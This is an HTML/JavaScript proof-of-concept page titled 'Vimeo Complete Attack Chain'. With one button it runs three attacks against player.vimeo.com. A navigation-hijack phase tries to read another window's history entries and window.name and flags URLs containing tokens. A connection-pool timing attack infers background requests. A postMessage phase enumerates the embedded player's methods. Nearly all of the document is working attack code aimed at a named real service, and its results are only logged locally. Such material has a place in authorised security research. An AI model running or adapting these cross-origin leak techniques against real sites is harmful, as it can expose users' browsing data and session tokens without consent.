<!DOCTYPE html>
<html>
<head>
    <title>Vimeo Complete Attack Chain</title>
</head>
<body>
    <h1>ðŸŽ¯ Complete Vimeo Attack</h1>
    <button onclick="fullAttack()">Execute Full Attack</button>
    <pre id="log"></pre>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) {
            logEl.textContent += msg + '\n';
            console.log(msg);
        }

        async function fullAttack() {
            log('=== PHASE 1: Navigation API Attack ===');
            await navigationAttack();
            
            log('\n=== PHASE 2: Timing Attack ===');
            await timingAttack();
            
            log('\n=== PHASE 3: PostMessage Enumeration ===');
            await postMessageAttack();
        }

        async function navigationAttack() {
            return new Promise((resolve) => {
                log('Opening Vimeo in new window...');
                const win = window.open('https://player.vimeo.com/video/935884964', 'vimeo');
                
                setTimeout(() => {
                    log('Hijacking to about:blank...');
                    win.location = 'about:blank';
                    
                    setTimeout(() => {
                        try {
                            if (win.navigation && win.navigation.entries) {
                                const entries = win.navigation.entries();
                                log(`âœ… Extracted ${entries.length} navigation entries`);
                                
                                entries.forEach((entry, i) => {
                                    log(`  [${i}] ${entry.url}`);
                                    
                                    // Check for tokens in URL
                                    const url = new URL(entry.url);
                                    if (url.search.includes('token') || url.hash.includes('token')) {
                                        log(`  ðŸš¨ POTENTIAL TOKEN FOUND`);
                                    }
                                });
                                
                                // Read window.name
                                if (win.name) {
                                    log(`Window name: ${win.name}`);
                                }
                                
                            } else {
                                log('âŒ Navigation API not available');
                            }
                            
                            // Close the window
                            win.close();
                            
                        } catch(e) {
                            log(`âŒ Error: ${e.message}`);
                        }
                        
                        resolve();
                    }, 2000);
                }, 3000);
            });
        }

        async function timingAttack() {
            // Load iframe that makes authenticated request
            const iframe = document.createElement('iframe');
            iframe.src = 'https://player.vimeo.com/video/935884964';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            await new Promise(r => setTimeout(r, 2000));
            
            log('Measuring connection pool...');
            const timings = [];
            
            // Make 12 requests in blocks of 6
            for (let i = 0; i < 12; i++) {
                const start = performance.now();
                await fetch(`https://player.vimeo.com/static/proxy.html?_=${Date.now()}_${i}`, 
                    { mode: 'no-cors' }
                ).catch(() => {});
                const duration = performance.now() - start;
                timings.push(duration);
                
                if ((i + 1) % 6 === 0) {
                    await new Promise(r => setTimeout(r, 100));
                }
            }
            
            const avg = timings.reduce((a,b) => a+b) / timings.length;
            log(`Average timing: ${avg.toFixed(2)}ms`);
            
            const slow = timings.filter(t => t > avg * 1.33);
            if (slow.length > 0) {
                log(`ðŸš¨ ${slow.length} slow requests detected (background XHR active)`);
            }
            
            iframe.remove();
        }

        async function postMessageAttack() {
            const iframe = document.createElement('iframe');
            iframe.src = 'https://player.vimeo.com/video/935884964';
            document.body.appendChild(iframe);
            
            await new Promise(r => setTimeout(r, 3000));
            
            log('Testing postMessage methods...');
            
            window.addEventListener('message', (e) => {
                if (e.origin === 'https://player.vimeo.com') {
                    log(`Response: ${JSON.stringify(e.data)}`);
                }
            });
            
            const methods = ['getVideoUrl', 'getVideoEmbedCode', 'getCurrentTime'];
            methods.forEach(method => {
                iframe.contentWindow.postMessage({ method }, '*');
            });
            
            await new Promise(r => setTimeout(r, 2000));
            iframe.remove();
        }
    </script>
</body>
</html>
